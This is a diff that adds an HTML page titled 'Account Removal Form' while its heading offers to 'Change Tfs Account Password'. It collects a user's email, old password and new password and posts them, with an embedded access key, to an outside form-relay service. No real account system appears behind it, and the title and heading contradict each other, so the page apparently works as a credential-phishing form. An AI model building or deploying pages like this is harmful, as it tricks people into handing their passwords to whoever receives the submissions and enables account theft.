@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+  <title>Account Removal Form</title>
+  <style>
+          body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+  </style>
+</head>
+<body>
+  <h5>
+<form action="https://api.web3forms.com/submit" method="POST">
+  <h3>Change Tfs Account Password</h3>
+  <h4>Password will be changed by 24 hours of request</h4>
+    <!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="45c74f93-efc2-406b-938e-a822fe7f8dbe">
+
+    <!-- Form Inputs. Each input must have a name="" attribute -->
+  <p> email:</p>
+    <input type="email" name="email" required>
+  <p> old password: </p>
+    <input type="password" name="old" required>
+  <p>  new password: </p>
+    <input type="password" name="new" required>
+
+
+  <p>
+    <button type="submit">Request</button>
+</p>
+</form>
+  </h5>
+</body>
+</html>
